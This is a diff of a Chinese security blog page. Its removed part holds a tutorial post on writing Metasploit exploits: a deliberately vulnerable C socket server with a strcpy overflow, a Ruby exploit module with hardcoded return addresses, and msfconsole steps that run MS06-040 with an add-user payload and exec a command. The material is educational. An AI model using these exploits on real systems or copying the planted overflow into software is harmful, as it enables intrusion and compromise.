@@ -6,13 +6,17 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://yoursite.com">
-  <title>Rabbitboat</title>
+  <title>0day安全3--堆溢出的利用 | Rabbitboat</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta property="og:type" content="website">
-<meta property="og:title" content="Rabbitboat">
-<meta property="og:url" content="http:&#x2F;&#x2F;yoursite.com&#x2F;index.html">
+  <meta name="description" content="注意，因为对堆的知识了解的很少，大家包括我自己对堆的概念了解的也很模糊，相关知识掌握的也不甚牢固，因此对堆方面的介绍篇幅较大。  0day安全3—堆溢出的利用1.堆的工作原理一、相关历史：其实微软没有公开操作系统中堆管理的系统，有很多研究Windows的大佬，对堆有众多的深刻研究，在此不给大家列举，从《0day安全》书上直接CV一段大佬们的研究成果：（1）Halvar Flake：2002 年的">
+<meta name="keywords" content="0day安全,堆溢出">
+<meta property="og:type" content="article">
+<meta property="og:title" content="0day安全3--堆溢出的利用">
+<meta property="og:url" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2019&#x2F;11&#x2F;17&#x2F;0day%E5%AE%89%E5%85%A83--%E5%A0%86%E6%BA%A2%E5%87%BA%E7%9A%84%E5%88%A9%E7%94%A8&#x2F;index.html">
 <meta property="og:site_name" content="Rabbitboat">
+<meta property="og:description" content="注意，因为对堆的知识了解的很少，大家包括我自己对堆的概念了解的也很模糊，相关知识掌握的也不甚牢固，因此对堆方面的介绍篇幅较大。  0day安全3—堆溢出的利用1.堆的工作原理一、相关历史：其实微软没有公开操作系统中堆管理的系统，有很多研究Windows的大佬，对堆有众多的深刻研究，在此不给大家列举，从《0day安全》书上直接CV一段大佬们的研究成果：（1）Halvar Flake：2002 年的">
 <meta property="og:locale" content="en">
+<meta property="og:updated_time" content="2019-11-18T15:01:36.858Z">
 <meta name="twitter:card" content="summary">
   
     <link rel="alternative" href="/atom.xml" title="Rabbitboat" type="application/atom+xml">
@@ -145,21 +149,24 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            
-  
-    <article id="post-0day安全3--堆溢出的利用" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+            <article id="post-0day安全3--堆溢出的利用" class="article article-type-post " itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
-    <h1 itemprop="name">
-      <a class="article-title" href="/2019/11/17/0day%E5%AE%89%E5%85%A83--%E5%A0%86%E6%BA%A2%E5%87%BA%E7%9A%84%E5%88%A9%E7%94%A8/">0day安全3--堆溢出的利用</a>
+    <h1 class="article-title" itemprop="name">
+      0day安全3--堆溢出的利用
     </h1>
   
 
         
         
+        <!-- 不蒜子统计 -->
+        <span id="busuanzi_container_page_pv" style='display:none' class="archive-article-date">
+              <i class="icon-smile icon"></i> 阅读数：<span id="busuanzi_value_page_pv"></span>次
+        </span>
+
 <a href="/2019/11/17/0day%E5%AE%89%E5%85%A83--%E5%A0%86%E6%BA%A2%E5%87%BA%E7%9A%84%E5%88%A9%E7%94%A8/" class="archive-article-date">
   	<time datetime="2019-11-17T10:49:11.265Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-11-17</time>
 </a>
@@ -181,6 +188,27 @@
 
       
 
+      
+        <div class="page-reward">
+          <a href="javascript:;" target="_blank" rel="noopener" class="page-reward-btn tooltip-top">
+            <div class="tooltip tooltip-east">
+            <span class="tooltip-item">
+              赏
+            </span>
+            <span class="tooltip-content">
+              <span class="tooltip-text">
+                <span class="tooltip-inner">
+                  <p class="reward-p"><i class="icon icon-quo-left"></i>谢谢你请我吃糖果<i class="icon icon-quo-right"></i></p>
+                  <div class="reward-box">
+                    
+                    
+                  </div>
+                </span>
+              </span>
+            </span>
+          </div>
+          </a>
+        </div>
       
     </div>
     <div class="article-info article-info-index">
@@ -204,16 +232,75 @@
       
 
       
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2019/11/17/0day%E5%AE%89%E5%85%A83--%E5%A0%86%E6%BA%A2%E5%87%BA%E7%9A%84%E5%88%A9%E7%94%A8/">展开全文 >></a>
-        </p>
-      
 
+      
+        
+<div class="share-btn share-icons tooltip-left">
+  <div class="tooltip tooltip-east">
+    <span class="tooltip-item">
+      <a href="javascript:;" target="_blank" rel="noopener" class="share-sns share-outer">
+        <i class="icon icon-share"></i>
+      </a>
+    </span>
+    <span class="tooltip-content">
+      <div class="share-wrap">
+        <div class="share-icons">
+          <a class="weibo share-sns" href="javascript:;" target="_blank" rel="noopener" data-type="weibo">
+            <i class="icon icon-weibo"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" target="_blank" rel="noopener" data-type="weixin">
+            <i class="icon icon-weixin"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" target="_blank" rel="noopener" data-type="qq">
+            <i class="icon icon-qq"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" target="_blank" rel="noopener" data-type="douban">
+            <i class="icon icon-douban"></i>
+          </a>
+          <a class="qzone share-sns" href="javascript:;" target="_blank" rel="noopener" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a>
+          <a class="facebook share-sns" href="javascript:;" target="_blank" rel="noopener" data-type="facebook">
+            <i class="icon icon-facebook"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" target="_blank" rel="noopener" data-type="twitter">
+            <i class="icon icon-twitter"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" target="_blank" rel="noopener" data-type="google">
+            <i class="icon icon-google"></i>
+          </a>
+        </div>
+      </div>
+    </span>
+  </div>
+</div>
+
+<div class="page-modal wx-share js-wx-box">
+    <a class="close js-modal-close" href="javascript:;" target="_blank" rel="noopener"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//pan.baidu.com/share/qrcode?url=http://yoursite.com/2019/11/17/0day%E5%AE%89%E5%85%A83--%E5%A0%86%E6%BA%A2%E5%87%BA%E7%9A%84%E5%88%A9%E7%94%A8/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div class="mask js-mask"></div>
       
       <div class="clearfix"></div>
     </div>
   </div>
 </article>
+
+  
+<nav id="article-nav">
+  
+  
+    <a href="/2019/11/14/0day%E5%AE%89%E5%85%A82--metaspoit%E5%BC%80%E5%8F%91exploit/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">0day安全2--metaspoit开发exploit</div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
+
 
 <aside class="wrap-side-operation">
     <div class="mod-side-operation">
@@ -228,723 +315,43 @@
         </div>
         
         
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-0day安全2--metaspoit开发exploit" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2019/11/14/0day%E5%AE%89%E5%85%A82--metaspoit%E5%BC%80%E5%8F%91exploit/">0day安全2--metaspoit开发exploit</a>
-    </h1>
-  
-
-        
-        
-<a href="/2019/11/14/0day%E5%AE%89%E5%85%A82--metaspoit%E5%BC%80%E5%8F%91exploit/" class="archive-article-date">
-  	<time datetime="2019-11-13T16:01:10.651Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-11-14</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="用MetaSploit开发Exploit"><a href="#用MetaSploit开发Exploit" class="headerlink" title="用MetaSploit开发Exploit"></a>用MetaSploit开发Exploit</h1><blockquote>
-<p>前言：对于学习汇编语言、逆向、二进制有困难的同学，极力推荐MSF，就像软件开发中的MFC架构、.net架构一样，安全技术领域的开发有其独特的平台—通用化漏洞测试、利用平台—MSF</p>
-</blockquote>
-<h2 id="1-漏洞测试平台MSF简介"><a href="#1-漏洞测试平台MSF简介" class="headerlink" title="1.漏洞测试平台MSF简介"></a>1.漏洞测试平台MSF简介</h2><p>通过栈溢出的讲解，其实可以归纳出漏洞利用技术的一些独立过程</p>
-<p>（1）触发漏洞：缓冲区有多大，第几个字节淹没返回地址，如何植入代码<br>（2）选取shellcode，执行什么样的shellcode？作为安全测试?还是用于入侵的端口绑定？恶意的网站下载、木马上传?<br>（3）重要的参数设置：设置目标主机的IP、端口号、消息框所选内容等等<br>（4）选用编码、解码算法：为了保护shellcode进行编码，为了正常执行shellcode进行解码等等</p>
-<p>针对漏洞的攻击测试，能不能进行模块化的生产与组装?使之能够做到对任意目标、使用任意航线，选取适当引爆方式等等。2003年7月，H D Moore开发的–MetaSploit1.0，实现了对漏洞测试的各个环节进行了封装、模块化、标准化架构。</p>
-<h2 id="2-metasploit的使用介绍："><a href="#2-metasploit的使用介绍：" class="headerlink" title="2.metasploit的使用介绍："></a>2.metasploit的使用介绍：</h2><p>metasploit提供了3套用户界面：GUI界面、普通命令行界面（console）、Ruby命令界面。主要介绍GUI界面和console界面</p>
-<h3 id="GUI界面："><a href="#GUI界面：" class="headerlink" title="GUI界面："></a>GUI界面：</h3><p>如图：<br><img src="https://github.com/rabbitboat/IMG/raw/master/image/0day%E5%AE%89%E5%85%A82--%E7%94%A8metasploit%E5%BC%80%E5%8F%91shellcode/metasploit%E5%90%AF%E5%8A%A8%E7%95%8C%E9%9D%A2.png" alt="show1"></p>
-<p>单机Exploits，会返回出Metasploit所能测试的所有漏洞及其描述，之后可以在搜索栏中输入，搜索漏洞的exploit模块，选择模块点击后可以选择配置target，之后MSF会自动列出所有可以哦用于这个漏洞的shellcode，选择后进行payload配置。</p>
-<h3 id="console界面"><a href="#console界面" class="headerlink" title="console界面"></a>console界面</h3><p>个人比较倾向于使用console界面，并且喜欢利用kali虚拟机，kali虚拟机集成了各种渗透、攻击软件、平台与模块，使用起来方便可控。<br>（1）show exploits<br>显示 MetaSploit 目前所能够测试的所有漏洞及相关描述。<br>（2）use windows/smb/ms06_040_netapi<br>选择 MS06-040 进行测试。<br>（3）info<br>显示当前所选漏洞的描述信息。<br>（4）show targets<br>显示当前所选漏洞能够影响的操作系统。<br>（5）set target 0<br>设置 target 为 0，即自动识别 Windows 2000 和 Windows XP 系统。<br>（6）show payloads<br>显示可适用于当前所选漏洞的 shellcode。<br>（7）set payload windows/adduser<br>选用 adduser 为 shellcode。<br>（8）show options<br>显示当前所选漏洞和 shellcode 需要配置的选项。<br>（9）set RHOST 192.168.88.137<br>按照 show options 的提示设置目标主机地址。<br>（10）set PASS 123456<br>按照 show options 的提示设置账户密码。<br>（11）set USER failwest<br>按照 show options 的提示设置用户名。<br>（11）exploit<br>进行攻击测试。  </p>
-<h2 id="3-利用MSF制作shellcode"><a href="#3-利用MSF制作shellcode" class="headerlink" title="3.利用MSF制作shellcode"></a>3.利用MSF制作shellcode</h2><p>metasploit包含的众多Payload模块可以导出各种编程语言表示的shellcode<br>单击界面中的Payloads，将显示MSF中所有的shellcode，目前，MSF 包含了可用于多种操作系统的 shellcode<br>各种配置方式如下：<br>（1）EXITFUNC 4<br>指程序退出的方法，默认情况下一般是 SEH，即产生异常时退出。我们这里选择 process，<br>即在程序结束时退出。<br>（2）CMD<br>这个 shellcode用于执行一条任意命令，所以需要在这里指明。比如我们使用 calc，用于打<br>开 Windows 的计算器。<br>（3）Max Size<br>限制 shellcode 的最大长度，这里可以忽略不填。<br>（4）Restricted Characters<br>shellcode 中需要避免使用的字节，默认情况下是 0x00，即字符串结束符 NULL。也可以回<br>避使用多个字节，用 0xXX 的方式指明，并用空格隔开即可。<br>（5）Selected Encoder<br>选择编码算法，目前的 MSF 提供了 23 种编码算法，可供这个 shellcode 使用的 x86 平台下的编码器有 14 种，在默认情况下将使用 x86/shikata_ga_nai。这个编码器是由 spoonm 提供的，<br>算法的主要思想和我们在书中3.5节实现的简易编码器类似，也是使用异或的方法，但是这里的实现更加完善。<br>（6）Format<br>设置导出格式。目前支持 C 语言、Ruby 语言、Perl 脚本、JavaScript 和原始十六进制（通常显示为乱码）的形式。这里默认选择 C 语言。导出的 shellcode 中将自动加上解码指令。<br>单击“Generate”按钮之后就能得到经过编码的高质量通用 shellcode 了</p>
-<h2 id="4-用MSF扫描跳板"><a href="#4-用MSF扫描跳板" class="headerlink" title="4.用MSF扫描跳板"></a>4.用MSF扫描跳板</h2><p>在栈溢出一篇讲过，为了更好地定位shellcode，我们利用跳转做跳板，因此我们需要找到跳板的地址。MSF中附带了许多小工具，msfpescan就是一个常用插件，可以扫描跳转指令并且直接转化为VA的工具。下图是msfpescan的用法：<br><img src="https://github.com/rabbitboat/IMG/raw/master/image/0day%E5%AE%89%E5%85%A82--%E7%94%A8metasploit%E5%BC%80%E5%8F%91shellcode/msfpescan%E7%94%A8%E6%B3%95.png" alt="show2"></p>
-<p>（1）首先从开始菜单启动 MSF 3.4.0 的“Metasploit Console”。<br>（2）键入命令 msfpescan –h 可以查看这个工具的说明。<br>（3）键入命令 msfpescan -f -j ecx c:/windows/system32/kernel32.dll 扫描 PE 文件 kernel32.dll，搜索其中类似 jump ecx 的指令地址，并转化成 VA 显示</p>
-<h2 id="5-Ruby语言"><a href="#5-Ruby语言" class="headerlink" title="5.Ruby语言"></a>5.Ruby语言</h2><p>pdf P154<br>Ruby是msf的开发语言，和python类似</p>
-<h2 id="6-Ruby语言实用"><a href="#6-Ruby语言实用" class="headerlink" title="6.Ruby语言实用"></a>6.Ruby语言实用</h2><p>shellcode：简易的TCP socket程序，在7777端口监听TCP链接，如果收到数据就在屏幕上打印。<br>代码如下：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;iostream.h&gt; </span><br><span class="line">#include&lt;winsock2.h&gt; </span><br><span class="line">#pragma comment(lib, &quot;ws2_32.lib&quot;) </span><br><span class="line">void msg_display(char * buf) </span><br><span class="line">&#123; </span><br><span class="line">	char msg[200]; </span><br><span class="line">	strcpy(msg,buf);// overflow here, copy 0x200 to 200 </span><br><span class="line">	cout&lt;&lt;&quot;********************&quot;&lt;&lt;endl; </span><br><span class="line">	cout&lt;&lt;&quot;received:&quot;&lt;&lt;endl; </span><br><span class="line">	cout&lt;&lt;msg&lt;&lt;endl; </span><br><span class="line">&#125; </span><br><span class="line">void main() </span><br><span class="line">&#123;</span><br><span class="line">	int sock,msgsock,lenth,receive_len; </span><br><span class="line">	struct sockaddr_in sock_server,sock_client; </span><br><span class="line">	char buf[0x200]; //noticed it is 0x200 </span><br><span class="line">	WSADATA wsa; </span><br><span class="line">	WSAStartup(MAKEWORD(1,1),&amp;wsa); </span><br><span class="line">	if((sock=socket(AF_INET,SOCK_STREAM,0))&lt;0) </span><br><span class="line">	&#123; </span><br><span class="line">		cout&lt;&lt;sock&lt;&lt;&quot;socket creating error!&quot;&lt;&lt;endl; </span><br><span class="line">		exit(1); </span><br><span class="line">	&#125; </span><br><span class="line">	sock_server.sin_family=AF_INET; </span><br><span class="line">	sock_server.sin_port=htons(7777); </span><br><span class="line">	sock_server.sin_addr.s_addr=htonl(INADDR_ANY); </span><br><span class="line">	if(bind(sock,(struct sockaddr*)&amp;sock_server,sizeof(sock_server))) </span><br><span class="line">	&#123; </span><br><span class="line">		cout&lt;&lt;&quot;binging stream socket error!&quot;&lt;&lt;endl; </span><br><span class="line">	&#125; </span><br><span class="line">	cout&lt;&lt;&quot;**************************************&quot;&lt;&lt;endl; </span><br><span class="line">	cout&lt;&lt;&quot; exploit target server 1.0 &quot;&lt;&lt;endl; </span><br><span class="line">	cout&lt;&lt;&quot;**************************************&quot;&lt;&lt;endl; </span><br><span class="line">	listen(sock,4); </span><br><span class="line">	lenth=sizeof(struct sockaddr); </span><br><span class="line">	do&#123; </span><br><span class="line">		msgsock=accept(sock,(struct sockaddr*)&amp;sock_client,(int*)&amp;lenth); </span><br><span class="line">		if(msgsock==-1) </span><br><span class="line">		&#123; </span><br><span class="line">			cout&lt;&lt;&quot;accept error!&quot;&lt;&lt;endl; </span><br><span class="line">			break; </span><br><span class="line">		&#125; </span><br><span class="line">		else </span><br><span class="line">		do </span><br><span class="line">		&#123; </span><br><span class="line">			memset(buf,0,sizeof(buf)); </span><br><span class="line">			if((receive_len=recv(msgsock,buf,sizeof(buf),0))&lt;0) </span><br><span class="line">			&#123;	</span><br><span class="line">				cout&lt;&lt;&quot;reading stream message erro!&quot;&lt;&lt;endl; </span><br><span class="line">				receive_len=0; </span><br><span class="line">			&#125; </span><br><span class="line">			msg_display(buf);//trigged the overflow </span><br><span class="line">		&#125;while(receive_len); </span><br><span class="line">		closesocket(msgsock); </span><br><span class="line">		&#125;while(1); </span><br><span class="line">	WSACleanup();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>用于测试这个漏洞的Ruby脚本如下：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env ruby </span><br><span class="line">require &apos;msf/core&apos; </span><br><span class="line">class Metasploit3 &lt; Msf::Exploit::Remote </span><br><span class="line">    include Exploit::Remote::Tcp </span><br><span class="line">    def initialize(info = &#123;&#125;) </span><br><span class="line">        super(update_info(info, </span><br><span class="line">        &apos;Name&apos; =&gt; &apos;failwest_test&apos;, </span><br><span class="line">        &apos;Platform&apos; =&gt; &apos;win&apos;, </span><br><span class="line">        &apos;Targets&apos; =&gt; [ </span><br><span class="line">            [&apos;Windows 2000&apos;, &#123;&apos;Ret&apos; =&gt; 0x77F8948B &#125; ], </span><br><span class="line">            [&apos;Windows XP SP2&apos;,&#123;&apos;Ret&apos; =&gt; 0x7C914393 &#125; ] </span><br><span class="line">            ], </span><br><span class="line">        &apos;Payload&apos; =&gt; &#123; </span><br><span class="line">                &apos;Space&apos; =&gt; 200, </span><br><span class="line">                &apos;BadChars&apos; =&gt; &quot;\x00&quot;, </span><br><span class="line">                    &#125; </span><br><span class="line">        )) </span><br><span class="line">    end #end of initialize </span><br><span class="line">    def exploit </span><br><span class="line">        connect </span><br><span class="line">        attack_buf = &apos;a&apos;*200 + [target[&apos;Ret&apos;]].pack(&apos;V&apos;) + payload. </span><br><span class="line">        encoded</span><br><span class="line">        sock.put(attack_buf) </span><br><span class="line">        handler </span><br><span class="line">        disconnect </span><br><span class="line">    end #end of exploit def </span><br><span class="line">end #end of class def</span><br></pre></td></tr></table></figure>
-<p>在类中只定义了两个方法，一个是initialize、另一个是exploit，模块的整体架构可以看成：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">class xxx </span><br><span class="line">    def initialize </span><br><span class="line">    #定义模块初始化信息，如漏洞适用的操作系统平台、为不同操作系</span><br><span class="line">    #统指明不同的返回地址、指明 shellcode 中禁止出现的特殊字符、</span><br><span class="line">    #漏洞相关的描述、URL 引用、作者信息等</span><br><span class="line">    end</span><br><span class="line"></span><br><span class="line">    def exploit </span><br><span class="line">    #将填充物、返回地址、shellcode 等组织成最终的 attack_buffer，并</span><br><span class="line">    #发送</span><br><span class="line">    end</span><br><span class="line">end</span><br></pre></td></tr></table></figure>
-<p>下面分块分析一下，对于类initialize，实现方法貌似是在填空，上个脚本代码只是填充了最基本的信息</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">def initialize(info = &#123;&#125;) </span><br><span class="line">    super(update_info(info, </span><br><span class="line">        &apos;Name&apos; =&gt; &apos;failwest_test&apos;, </span><br><span class="line">        &apos;Platform&apos; =&gt; &apos;win&apos;, </span><br><span class="line">        &apos;Targets&apos; =&gt; [ </span><br><span class="line">            [&apos;Windows 2000&apos;, &#123;&apos;Ret&apos; =&gt; 0x77F8948B &#125; ], </span><br><span class="line">            [&apos;Windows XP SP2&apos;,&#123;&apos;Ret&apos; =&gt; 0x7C914393 &#125; ] </span><br><span class="line">            ], </span><br><span class="line">        &apos;Payload&apos; =&gt; &#123; </span><br><span class="line">            &apos;Space&apos; =&gt; 200, </span><br><span class="line">            &apos;BadChars&apos; =&gt; &quot;\x00&quot;,</span><br><span class="line">                    &#125; </span><br><span class="line">            )) </span><br><span class="line">    end #end of initialize</span><br></pre></td></tr></table></figure>
-<p>从代码中可以看到，initialize 实际上只调用了一个方法 update_info 来初始化 info 数据结构。<br>初始化的过程通过一系列 hash 操作完成。<br>（1）Name 模块的名称，MSF 通过这个名称来引用本模块。<br>（2）Platform 模块运行平台，MSF 通过这个值来为 exploit 挑选 payload。本例中，该值为‘win’，所以 MSF 将只选用 Windows 平台的 payload，BSD 和 Linux 的 payload 将被自动禁用。<br>（3）Targets 可以定义多种操作系统版本中的返回地址，本例中定义了 Windows 2 000 和Windows XP SP2 两种，跳转指令选用 jmp esp，均来自 ntdll.dll。在实验时您可能需要根据实验环境重新确定这个值。搜索跳转指令地址的方法参看 3.2 节和 4.4 节。<br>（4）Payload 对 shellcode 的要求，如大小和禁止使用的字节等。由于漏洞函数使用 strcpy函数，故字符串结束符 0x00 应该被禁用。MSF 会根据这里的设置自动选用编码算法对 shellcode进行加工以满足测试要求。</p>
-<p>再分析exploit的定义：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">def exploit </span><br><span class="line">    connect </span><br><span class="line">    attack_buf = &apos;a&apos;*200 + [target[&apos;Ret&apos;]].pack(&apos;V&apos;) + payload.encoded </span><br><span class="line">    sock.put(attack_buf) </span><br><span class="line">    handler </span><br><span class="line">    disconnect </span><br><span class="line">end #end of exploit def</span><br></pre></td></tr></table></figure>
-<p>主要说明一行：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">attack_buf = &apos;a&apos;*200 + [target[&apos;Ret&apos;]].pack(&apos;V&apos;) + payload.encoded</span><br></pre></td></tr></table></figure>
-<p>1.首先选用 200 个字母“a”填充缓冲区。<br>2.pack(‘V’)的作用是把数据按照 DWORD 逆序。(注意数值数据和内存数据的区别，需要反写)<br>3.填充了缓冲区和返回地址后，再连上经过编码的 shellcode，就得到了最终的 attack_buf。<br>4.其中，payload.encoded 会在使用时由 MSF 提示我们手工配置并生成。<br>代码解释完毕，除去所有模块都必须的格式性代码，实际上有效的语句不过十多行。</p>
-<p>个人喜欢在Kali Linux中利用metasploit，比如我们在Kali Linux里面添加自己的exploits脚本，则只需要在文件夹exploits中添加Ruby脚本文件夹及脚本文件，exploits文件夹所处位置如下：</p>
-<p><img src="https://github.com/rabbitboat/IMG/raw/master/image/0day%E5%AE%89%E5%85%A82--%E7%94%A8metasploit%E5%BC%80%E5%8F%91shellcode/exploits%E8%84%9A%E6%9C%AC%E6%89%80%E5%A4%84%E4%BD%8D%E7%BD%AE.png" alt="show3"></p>
-<p>脚本编写成功：<br><img src="https://github.com/rabbitboat/IMG/raw/master/image/0day%E5%AE%89%E5%85%A82--%E7%94%A8metasploit%E5%BC%80%E5%8F%91shellcode/%E8%87%AA%E5%B7%B1%E7%BC%96%E5%86%99exploits%E8%84%9A%E6%9C%AC%E6%88%90%E5%8A%9F.png" alt="show4"></p>
-<p>存储完毕后启动msfconsole即可：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">show exploits      应该能看到我们所添加的模块位于 failwest/test </span><br><span class="line">use failwest/test  选用我们添加的模块</span><br><span class="line">show targets       显示可用的目标操作系统</span><br><span class="line">set target 0       设置测试目标为 Windows 2000 系统</span><br><span class="line">show payloads      显示可用的 shellcode </span><br><span class="line">set payload windows/exec 这个 shellcode 可以执行一条任意的命令</span><br><span class="line">show options       显示需要配置的信息</span><br><span class="line">set rhost xxx.xxx.xxx.xxx  设置目标主机的 IP 地址，如在本地测试，则为 127.0.0.1 </span><br><span class="line">set rport 7777      设置目标程序使用的端口，这里是 7777 </span><br><span class="line">set cmd calc        配置 shellcode 待执行的命令，“calc”用于打开计算器</span><br><span class="line">set exitfunc seh    以 SEH 退出程序</span><br><span class="line">exploit             发送测试数据，执行攻击</span><br></pre></td></tr></table></figure>
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" target="_blank" rel="noopener" class="js-tag article-tag-list-link color2">0day安全</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" target="_blank" rel="noopener" class="js-tag article-tag-list-link color1">metasploit</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" target="_blank" rel="noopener" class="js-tag article-tag-list-link color4">msf</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" target="_blank" rel="noopener" class="js-tag article-tag-list-link color2">Ruby脚本</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" target="_blank" rel="noopener" class="js-tag article-tag-list-link color3">Exploit</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2019/11/14/0day%E5%AE%89%E5%85%A82--metaspoit%E5%BC%80%E5%8F%91exploit/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" target="_blank" rel="noopener" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
+        <div class="toc-container tooltip-left">
+            <i class="icon-font icon-category"></i>
+            <div class="tooltip tooltip-east">
+                <span class="tooltip-item">
+                </span>
+                <span class="tooltip-content">
+                    <div class="toc-article">
+                    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0day安全3—堆溢出的利用"><span class="toc-number">1.</span> <span class="toc-text">0day安全3—堆溢出的利用</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-堆的工作原理"><span class="toc-number">1.1.</span> <span class="toc-text">1.堆的工作原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-堆的再深入"><span class="toc-number">1.2.</span> <span class="toc-text">2.堆的再深入</span></a></li></ol></li></ol>
+                    </div>
+                </span>
             </div>
         </div>
         
-        
     </div>
 </aside>
 
 
 
-
   
-    <article id="post-0day安全--栈溢出" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
